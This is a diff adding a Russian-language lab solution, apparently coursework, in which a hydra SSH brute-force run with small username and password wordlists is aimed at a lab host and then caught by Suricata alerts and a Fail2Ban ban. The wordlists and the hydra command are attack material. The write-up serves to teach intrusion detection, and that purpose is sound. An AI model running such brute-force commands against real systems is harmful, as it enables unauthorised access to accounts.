@@ -201,3 +201,81 @@ Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds
 *В качестве ответа пришлите события, которые попали в логи Suricata и Fail2Ban, прокомментируйте результат.*
 
 #### Решение 2
+Содержимое файлов
+```
+──(user㉿vm-nix-kali1)-[~]
+└─$ cat pass.txt
+123456
+password
+12345678
+qwerty
+123456789
+12345
+1234
+111111
+1234567
+admin
+usr
+user
+uuserrrrrrrr
+                                                                                                          
+┌──(user㉿vm-nix-kali1)-[~]
+└─$ cat user.txt
+root
+admin
+user
+test
+guest
+ubuntu
+debian
+oracle
+postgres
+nginx
+```
+Команда:
+```
+hydra -L user.txt -P pass.txt 192.168.17.130 ssh
+```
+
+Логи:
+```
+──(user㉿vm-nix-kali1)-[~]
+└─$ hydra -L user.txt -P pass.txt 192.168.17.130 ssh
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-19 18:44:54
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 130 login tries (l:10/p:13), ~9 tries per task
+[DATA] attacking ssh://192.168.17.130:22/
+[ERROR] all children were disabled due too many connection errors
+0 of 1 target completed, 0 valid password found
+[INFO] Writing restore file because 2 server scans could not be completed
+[ERROR] 1 target was disabled because of too many errors
+[ERROR] 1 targets did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-19 18:45:33
+
+```
+
+Suracata сразу обнаржил, что вероятно идет перебор SSHЖ
+```
+10/19/2025-18:44:54.367551  [**] [1:2001219:20] ET SCAN Potential SSH Scan [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} 192.168.17.128:47626 -> 192.168.17.130:22
+10/19/2025-18:44:54.515305  [**] [1:2006546:9] ET SCAN LibSSH Based Frequent SSH Connections Likely BruteForce Attack [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 192.168.17.128:47606 -> 192.168.17.130:22
+```
+![Suricata](image-3.png)
+
+Fail2Ban обнаружил, что идут попытки подключения и после 10 неудачных попыток заблокировал атакуюший хост.
+```
+2025-10-19 18:44:54,719 fail2ban.filter         [6227]: INFO    [sshd] Found 192.168.17.128 - 2025-10-19 18:44:54
+2025-10-19 18:44:54,720 fail2ban.filter         [6227]: INFO    [sshd] Found 192.168.17.128 - 2025-10-19 18:44:54
+2025-10-19 18:44:56,479 fail2ban.filter         [6227]: INFO    [sshd] Found 192.168.17.128 - 2025-10-19 18:44:56
+2025-10-19 18:44:56,480 fail2ban.filter         [6227]: INFO    [sshd] Found 192.168.17.128 - 2025-10-19 18:44:56
+2025-10-19 18:44:56,480 fail2ban.filter         [6227]: INFO    [sshd] Found 192.168.17.128 - 2025-10-19 18:44:56
+2025-10-19 18:44:56,756 fail2ban.filter         [6227]: INFO    [sshd] Found 192.168.17.128 - 2025-10-19 18:44:56
+2025-10-19 18:44:56,756 fail2ban.filter         [6227]: INFO    [sshd] Found 192.168.17.128 - 2025-10-19 18:44:56
+2025-10-19 18:44:56,757 fail2ban.filter         [6227]: INFO    [sshd] Found 192.168.17.128 - 2025-10-19 18:44:56
+2025-10-19 18:44:56,757 fail2ban.filter         [6227]: INFO    [sshd] Found 192.168.17.128 - 2025-10-19 18:44:56
+2025-10-19 18:44:56,757 fail2ban.filter         [6227]: INFO    [sshd] Found 192.168.17.128 - 2025-10-19 18:44:56
+2025-10-19 18:44:56,913 fail2ban.actions        [6227]: NOTICE  [sshd] Ban 192.168.17.128
+
+```
+![Fail2Ban](image-4.png)
